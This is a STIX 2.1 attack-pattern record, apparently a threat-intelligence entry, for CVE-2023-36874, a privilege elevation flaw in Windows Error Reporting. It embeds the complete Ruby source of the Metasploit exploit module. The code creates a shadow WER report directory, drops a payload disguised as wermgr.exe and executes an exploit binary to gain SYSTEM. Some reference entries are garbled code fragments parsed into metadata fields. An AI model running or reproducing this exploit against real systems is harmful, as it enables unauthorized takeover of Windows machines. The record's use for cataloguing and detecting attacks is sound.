{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ba6bb2bb-7426-45eb-b74e-267d5e454092",
    "created": "2024-08-14T16:48:57.219986Z",
    "modified": "2024-08-14T16:48:57.219989Z",
    "name": "Microsoft Error Reporting Local Privilege Elevation Vulnerability",
    "description": " This module takes advantage of a bug in the way Windows error reporting opens the report parser.  If you open a report, Windows uses a relative path to locate the rendering program. By creating a specific alternate directory structure, we can coerce Windows into opening an arbitrary executable as SYSTEM. If the current user is a local admin, the system will attempt impersonation and the exploit will fail.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/win_error_cve_2023_36874.rb",
            "external_id": "win_error_cve_2023_36874.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-36874"
        },
        {
            "source_name": "reference",
            "url": "https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Wh04m1001/CVE-2023-36874"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Octoberfest7/CVE-2023-36874_BOF"
        },
        {
            "source_name": "wer_report_data=exploit_data(CVE-2023-36874",
            "external_id": "Report.wer)"
        },
        {
            "source_name": "wer_report_data=exploit_data(CVE-2023-36874",
            "external_id": "Report.wer)"
        },
        {
            "source_name": "exploit_bin=exploit_data(CVE-2023-36874",
            "external_id": "CVE-2023-36874.exe)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::EXE\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Error Reporting Local Privilege Elevation Vulnerability',\n        'Description' => %q{\n          This module takes advantage of a bug in the way Windows error reporting opens the report\n          parser.  If you open a report, Windows uses a relative path to locate the rendering program.\n          By creating a specific alternate directory structure, we can coerce Windows into opening an\n          arbitrary executable as SYSTEM.\n          If the current user is a local admin, the system will attempt impersonation and the exploit will\n          fail.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Filip Dragovi\u0107 (Wh04m1001)', # PoC\n          'Octoberfest7', # PoC\n          'bwatters-r7' # msf module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => [ 'meterpreter', 'shell', 'powershell' ],\n        'Targets' => [\n          [ 'Automatic', { 'Arch' => [ ARCH_X64 ] } ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-07-11',\n        'References' => [\n          ['CVE', '2023-36874'],\n          ['URL', 'https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/'],\n          ['URL', 'https://github.com/Wh04m1001/CVE-2023-36874'],\n          ['URL', 'https://github.com/Octoberfest7/CVE-2023-36874_BOF']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('EXPLOIT_NAME',\n                    [true, 'The filename to use for the exploit binary (%RAND%.exe by default).', \"#{Rex::Text.rand_text_alpha(6..14)}.exe\"]),\n      OptString.new('REPORT_DIR',\n                    [true, 'The Error Directory to use (%RAND% by default).', Rex::Text.rand_text_alpha(6..14).to_s]),\n      OptString.new('SHADOW_DRIVE',\n                    [true, 'Directory to place in the home drive for pivot (%TEMP% by default).', Rex::Text.rand_text_alpha(6..14).to_s]),\n      OptInt.new('EXECUTE_DELAY',\n                 [true, 'The number of seconds to delay between file upload and exploit launch', 3])\n    ])\n  end\n\n  # When we pass the directory value to the mkdir method, the mkdir method\n  # passes the reference to the string containing the directory.\n  # We do a lot of string manipulation in this module, so this is a quick\n  # hack to make sure that despite what we do with the string after we create\n  # the directory, it is  the actual directory we created that gets sent to\n  # the cleanup methods.\n  def clone_mkdir(dir)\n    mkdir(dir.clone)\n  end\n\n  def upload_error_report\n    wer_archive_dir = get_env('PROGRAMDATA')\n    vprint_status(wer_archive_dir)\n    wer_archive_dir << '\\\\Microsoft\\\\Windows\\\\WER\\\\ReportArchive'\n    report_dir = \"#{wer_archive_dir}\\\\#{datastore['REPORT_DIR']}\"\n    report_filename = \"#{report_dir}\\\\Report.wer\"\n    vprint_status(\"Creating #{report_dir}\")\n    clone_mkdir(report_dir)\n    wer_report_data = exploit_data('CVE-2023-36874', 'Report.wer')\n    vprint_status(\"Writing Report to #{report_filename}\")\n    write_file(report_filename, wer_report_data)\n  end\n\n  def build_shadow_archive_dir(shadow_base_dir)\n    wer_archive_dir = shadow_base_dir\n    clone_mkdir(wer_archive_dir)\n    wer_archive_dir << '\\\\ProgramData\\\\'\n    clone_mkdir(wer_archive_dir)\n    wer_archive_dir << 'Microsoft\\\\'\n    clone_mkdir(wer_archive_dir)\n    wer_archive_dir << 'Windows\\\\'\n    clone_mkdir(wer_archive_dir)\n    wer_archive_dir << 'WER\\\\'\n    clone_mkdir(wer_archive_dir)\n    wer_archive_dir << 'ReportArchive\\\\'\n    clone_mkdir(wer_archive_dir)\n    report_dir = \"#{wer_archive_dir}#{datastore['REPORT_DIR']}\"\n    clone_mkdir(report_dir)\n    return report_dir\n  end\n\n  def upload_shadow_report(shadow_archive_dir)\n    report_filename = \"#{shadow_archive_dir}\\\\Report.wer\"\n    wer_report_data = exploit_data('CVE-2023-36874', 'Report.wer')\n    vprint_status(\"Writing bad Report to #{report_filename}\")\n    write_file(report_filename, wer_report_data)\n  end\n\n  def build_shadow_system32(shadow_base_dir)\n    shadow_win32 = \"#{shadow_base_dir}\\\\system32\"\n    vprint_status(\"Creating #{shadow_win32}\")\n    clone_mkdir(shadow_win32)\n    return shadow_win32\n  end\n\n  def upload_payload(shadow_win32)\n    payload_bin = generate_payload_exe\n    payload_filename = \"#{shadow_win32}\\\\wermgr.exe\"\n    vprint_status(\"Writing payload to #{payload_filename}\")\n    write_file(payload_filename, payload_bin)\n  end\n\n  def upload_execute_exploit(exploit_path, shadow_path, home_dir)\n    vprint_status(\"shadow_path = #{shadow_path}\")\n    exploit_bin = exploit_data('CVE-2023-36874', 'CVE-2023-36874.exe')\n    write_file(exploit_path, exploit_bin)\n    sleep datastore['EXECUTE_DELAY']\n    vprint_status(\"Exploit uploaded to #{exploit_path}\")\n    cmd = \"#{exploit_path} #{shadow_path} #{home_dir} #{datastore['REPORT_DIR']}\"\n    output = cmd_exec(cmd, nil, 30)\n    vprint_status(output)\n  end\n\n  def check\n    # This only appears to work on 22H2, but likely will work elsewhere if we figure out the function pointers.\n    version = get_version_info\n    vprint_status(\"OS version: #{version}\")\n    return Exploit::CheckCode::Appears if version.build_number == Msf::WindowsVersion::Win10_22H2\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    fail_with(Module::Failure::BadConfig, 'User cannot be local admin') if is_in_admin_group?\n    fail_with(Module::Failure::BadConfig, 'Already SYSTEM') if is_system?\n    shadow_dir = datastore['SHADOW_DRIVE']\n    home_dir = get_env('HOMEDRIVE')\n    shadow_path = \"#{home_dir}\\\\#{shadow_dir}\"\n    vprint_status(\"Shadow Path = #{shadow_path}\")\n    upload_error_report\n    shadow_archive_dir = build_shadow_archive_dir(shadow_path.dup)\n    upload_shadow_report(shadow_archive_dir)\n    shadow_system32 = build_shadow_system32(shadow_path.dup)\n    upload_payload(shadow_system32)\n    sleep datastore['EXECUTE_DELAY']\n    exploit_path = \"#{shadow_path}\\\\#{datastore['EXPLOIT_NAME']}\"\n    exploit_path << '.exe' unless exploit_path[-4..] == '.exe'\n    if shadow_dir.length > 64\n      fail_with(Module::Failure::BadConfig, 'REPORT_DIR value too long')\n    end\n    upload_execute_exploit(exploit_path, shadow_dir, home_dir)\n    print_warning(\"Manual deletion of #{shadow_path} may be required\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-07-11",
    "x_mitre_platforms": [
        "['win']"
    ]
}